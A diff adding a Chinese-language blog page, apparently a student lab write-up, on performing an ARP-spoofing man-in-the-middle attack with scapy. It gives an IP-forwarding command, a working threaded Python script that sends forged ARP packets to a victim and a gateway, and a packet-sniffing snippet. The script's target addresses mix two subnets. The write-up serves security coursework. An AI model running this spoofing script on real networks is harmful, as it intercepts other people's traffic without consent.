@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>scapy中间人攻击 | Imane&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="scapy实现中间人攻击（ARP欺骗）Scapy 是一个强大的，用 Python 编写的交互式数据包处理程序，它能让用户发送、嗅探、 解析，以及伪造网络报文，从而用来侦测、扫描和向网络发动攻击。Scapy 可以轻松地处理 扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和 发现网络(network di">
+<meta property="og:type" content="article">
+<meta property="og:title" content="scapy中间人攻击">
+<meta property="og:url" content="https://imane219.github.io/project/2021/04/12/scapy%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Imane&#39;s Blog">
+<meta property="og:description" content="scapy实现中间人攻击（ARP欺骗）Scapy 是一个强大的，用 Python 编写的交互式数据包处理程序，它能让用户发送、嗅探、 解析，以及伪造网络报文，从而用来侦测、扫描和向网络发动攻击。Scapy 可以轻松地处理 扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和 发现网络(network di">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/0/blog/myblog/source_posts/计算机网络安全实验/scapy1.png">
+<meta property="article:published_time" content="2021-04-12T13:37:06.000Z">
+<meta property="article:modified_time" content="2021-05-17T08:04:55.149Z">
+<meta property="article:author" content="Imane">
+<meta property="article:tag" content="ARP">
+<meta property="article:tag" content="scapy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/0/blog/myblog/source_posts/计算机网络安全实验/scapy1.png">
+  
+    <link rel="alternate" href="/project/atom.xml" title="Imane&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/project/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/project/" id="logo">Imane&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/project/">Home</a>
+        
+          <a class="main-nav-link" href="/project/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/project/categories">Categories</a>
+        
+          <a class="main-nav-link" href="/project/tags">Tags</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/project/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://Imane219.github.io/project"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-scapy中间人攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/04/12/scapy%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" class="article-date">
+  <time datetime="2021-04-12T13:37:06.000Z" itemprop="datePublished">2021-04-12</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      scapy中间人攻击
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="scapy实现中间人攻击（ARP欺骗）"><a href="#scapy实现中间人攻击（ARP欺骗）" class="headerlink" title="scapy实现中间人攻击（ARP欺骗）"></a>scapy实现中间人攻击（ARP欺骗）</h3><p>Scapy 是一个强大的，用 Python 编写的交互式数据包处理程序，它能让用户发送、嗅探、 解析，以及伪造网络报文，从而用来侦测、扫描和向网络发动攻击。Scapy 可以轻松地处理 扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和 发现网络(network discorvery)之类的传统任务。它可以代替 hping，arpspoof，arp-sk，arping， p0f 甚至是部分的 Nmap，tcpdump 和 tshark（wireshark 的命令行工具）的功能。</p>
+<p>scapy中文文档：<a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/scapy-docs/content/">https://wizardforcel.gitbooks.io/scapy-docs/content/</a></p>
+<p>scapy中常用函数:</p>
+<table>
+<thead>
+<tr>
+<th align="left">命令</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">str(pkt)</td>
+<td>组装数据包</td>
+</tr>
+<tr>
+<td align="left">hexdump(pkt)</td>
+<td>十六进制转储</td>
+</tr>
+<tr>
+<td align="left">ls(pkt)</td>
+<td>显示出字段值的列表</td>
+</tr>
+<tr>
+<td align="left">pkt.summary()</td>
+<td>一行摘要</td>
+</tr>
+<tr>
+<td align="left">pkt.show()</td>
+<td>针对数据包的展开视图</td>
+</tr>
+<tr>
+<td align="left">pkt.show2()</td>
+<td>显示聚合的数据包(例如：计算好了校验和)</td>
+</tr>
+<tr>
+<td align="left">pkt.sprintf()</td>
+<td>用数据包字段填充格式字符串</td>
+</tr>
+<tr>
+<td align="left">pkt.decode_payload_as()</td>
+<td>改变payload的decode方式</td>
+</tr>
+<tr>
+<td align="left">pkt.psdump()</td>
+<td>绘制一个解释说明的PostScript图表</td>
+</tr>
+<tr>
+<td align="left">pkt.pdfdump()</td>
+<td>绘制一个解释说明的PDF</td>
+</tr>
+<tr>
+<td align="left">pkt.command()</td>
+<td>返回可以生成数据包的scapy命令</td>
+</tr>
+<tr>
+<td align="left">summary()</td>
+<td>显示一个关于每个数据包的摘要列表</td>
+</tr>
+<tr>
+<td align="left">nsummary()</td>
+<td>同上，但规定了数据包数量</td>
+</tr>
+<tr>
+<td align="left">conversations()</td>
+<td>显示一个会话图表</td>
+</tr>
+<tr>
+<td align="left">show()</td>
+<td>显示首选表示(通常用nsummary())</td>
+</tr>
+<tr>
+<td align="left">filter()</td>
+<td>返回一个$\lambda$过滤后的数据包列表</td>
+</tr>
+<tr>
+<td align="left">hexdump()</td>
+<td>返回所有数据包的一个hexdump</td>
+</tr>
+<tr>
+<td align="left">hexraw()</td>
+<td>返回所有数据包Raw layer 的hexdump</td>
+</tr>
+<tr>
+<td align="left">padding()</td>
+<td>返回一个带填充数据包的hexdump</td>
+</tr>
+<tr>
+<td align="left">nzpadding()</td>
+<td>返回一个具有非零填充的数据包的hexdump</td>
+</tr>
+<tr>
+<td align="left">plot()</td>
+<td>规划一个应用到数据包列表的$\lambda$函数</td>
+</tr>
+<tr>
+<td align="left">make table()</td>
+<td>根据$\lambda$函数来显示表格</td>
+</tr>
+</tbody></table>
+<p><strong>要求：</strong>利用scapy实现arp中间人攻击，实现对交换网络环境下主机的监听。</p>
+<ul>
+<li>scapy实现arp欺骗</li>
+<li>linux下路由转发开启</li>
+<li>使用监听软件监听</li>
+</ul>
+<p><strong>步骤：</strong></p>
+<p>选择kali作为实验环境，kali中本身带有scapy。</p>
+<ol>
+<li><p>首先使用<code>cat /proc/sys/net/ipv4/ip_forward</code>命令查看ip转发功能是否打开，如果返回的值为0说明没有打开禁止转发，为1反之。linux默认关闭ip转发功能，但是由于我们需要kali模拟网关，需要打开ip转发功能，使用命令<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code>将1写入该文件中即可打开。</p>
+<blockquote>
+<p>注：上面的命令并没有保存对ip转发配置的更改，下次系统启动时仍会使用原来的值，要想永久修改IP转发，需要修改/etc/sysctl.conf文件，修 改下面一行的值： net.ipv4.ip_forward = 1 修改后可以重启系统来使修改生效，也可以执行下面的命令来使修改生效： sysctl -p /etc/sysctl.conf 。</p>
+</blockquote>
+</li>
+<li><p>接着编写python脚本实现arp欺骗，选择kali虚拟机作为攻击者，win10主机作为受害者，因此先找到主机ip和默认网关，可以通过扫描的方法发现。脚本的算法是不停地向受害主机和网关发送arp包，让网关以为kali虚拟机是与他通信的主机，让win10主机以为kali虚拟机是网关，因此可以截获双方发送的数据包。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8       #避免中文乱码</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p1 = ARP()</span><br><span class="line"><span class="comment">#被欺骗的主机ip</span></span><br><span class="line">p1.psrc = <span class="string">&quot;10.12.181.192&quot;</span></span><br><span class="line"><span class="comment">#网关ip</span></span><br><span class="line">p1.pdst = <span class="string">&quot;10.12.183.254&quot;</span></span><br><span class="line">p2 = ARP()</span><br><span class="line">p2.psrc = <span class="string">&quot;192.168.253.2&quot;</span></span><br><span class="line">p2.pdst = <span class="string">&quot;192.168.253.133&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qw</span>():</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">		time.sleep(<span class="number">0.8</span>)</span><br><span class="line">		send(p1)</span><br><span class="line"><span class="comment">#向目标发送欺骗包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qr</span>():</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">		time.sleep(<span class="number">0.8</span>)</span><br><span class="line">		send(p2)</span><br><span class="line"><span class="comment">#向网关发送欺骗包</span></span><br><span class="line">t1 = Thread(target = qw)</span><br><span class="line">t2 = Thread(target = qr)</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line"><span class="comment">### python3 arp.py  注意使用python3，因为scapy包下载在python3的目录当中</span></span><br></pre></td></tr></table></figure></li>
+<li><p>用一个终端执行python脚本，另一个终端嗅探，使用scapy的sniff函数来实现嗅探。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = sniff()</span><br><span class="line">data.show()</span><br></pre></td></tr></table></figure></li>
+<li><p>在主机的cmd中ping百度，可以发现有一定的延迟，因为ping包被攻击者截获转发，需要消耗一定时间，接着查看嗅探的结果，可以看到成功抓取到了DNS查询包，以及ping包。</p>
+<p><img src="D:\0\blog\myblog\source_posts\计算机网络安全实验\scapy1.png" alt="scapy1"></p>
+</li>
+</ol>
+<p><strong>遇到的问题：</strong>一开始使用driftnet想要截获访问的百度图片，但是始终没有截获到，但是不转发的话可以将主机断网，猜测是driftnet无法识别https加密过的图片。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/04/12/scapy%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" data-id="ckr5o9zyj000ixkurfiqp5mtz" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/ARP/" rel="tag">ARP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/scapy/" rel="tag">scapy</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/project/2021/04/18/%E9%80%86%E5%90%91/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          逆向
+        
+      </div>
+    </a>
+  
+  
+    <a href="/project/2021/04/12/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">信息系统安全</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/project/categories/Git/">Git</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/blog/">blog</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/">中国象棋</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">信息系统安全</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E5%AE%89%E5%8D%93/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/">虚拟机</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/">论文阅读</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E9%80%86%E5%90%91/">逆向</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/ARP/" rel="tag">ARP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/CV/" rel="tag">CV</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/Git/" rel="tag">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/STL/" rel="tag">STL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/TCP/" rel="tag">TCP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/adversarial-patch/" rel="tag">adversarial patch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/db/" rel="tag">db</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/encryption/" rel="tag">encryption</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/gdb/" rel="tag">gdb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/scapy/" rel="tag">scapy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/vpn/" rel="tag">vpn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" rel="tag">中国象棋</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%8E%92%E5%BA%8F/" rel="tag">排序</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%95%A3%E5%88%97/" rel="tag">散列</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" rel="tag">虚拟机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E9%80%92%E5%BD%92/" rel="tag">递归</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/project/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/project/tags/C/" style="font-size: 10px;">C++</a> <a href="/project/tags/CV/" style="font-size: 10px;">CV</a> <a href="/project/tags/DNS/" style="font-size: 10px;">DNS</a> <a href="/project/tags/Git/" style="font-size: 10px;">Git</a> <a href="/project/tags/STL/" style="font-size: 10px;">STL</a> <a href="/project/tags/TCP/" style="font-size: 10px;">TCP</a> <a href="/project/tags/adversarial-patch/" style="font-size: 10px;">adversarial patch</a> <a href="/project/tags/android/" style="font-size: 10px;">android</a> <a href="/project/tags/blog/" style="font-size: 20px;">blog</a> <a href="/project/tags/db/" style="font-size: 10px;">db</a> <a href="/project/tags/dp/" style="font-size: 10px;">dp</a> <a href="/project/tags/encryption/" style="font-size: 10px;">encryption</a> <a href="/project/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/project/tags/linux/" style="font-size: 10px;">linux</a> <a href="/project/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/project/tags/scapy/" style="font-size: 10px;">scapy</a> <a href="/project/tags/vpn/" style="font-size: 10px;">vpn</a> <a href="/project/tags/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" style="font-size: 15px;">中国象棋</a> <a href="/project/tags/%E5%88%B7%E9%A2%98/" style="font-size: 10px;">刷题</a> <a href="/project/tags/%E6%8E%92%E5%BA%8F/" style="font-size: 10px;">排序</a> <a href="/project/tags/%E6%95%A3%E5%88%97/" style="font-size: 10px;">散列</a> <a href="/project/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/project/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 10px;">流量分析</a> <a href="/project/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/project/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 10px;">虚拟机</a> <a href="/project/tags/%E9%80%86%E5%90%91/" style="font-size: 10px;">逆向</a> <a href="/project/tags/%E9%80%92%E5%BD%92/" style="font-size: 10px;">递归</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/project/2021/07/16/tmp/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/07/16/hexo%E4%BD%BF%E7%94%A8/">hexo使用</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/05/19/vpn/">miniVPN实现</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/05/18/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/">安卓程序加密算法及密钥生成过程分析</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/05/17/ECCV2020/">Bias-based Universal Adversarial Patch Attack for Automatic Check-out</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Imane<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/project/" class="mobile-nav-link">Home</a>
+  
+    <a href="/project/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/project/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/project/tags" class="mobile-nav-link">Tags</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/project/fancybox/jquery.fancybox.css">
+
+  
+<script src="/project/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/project/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
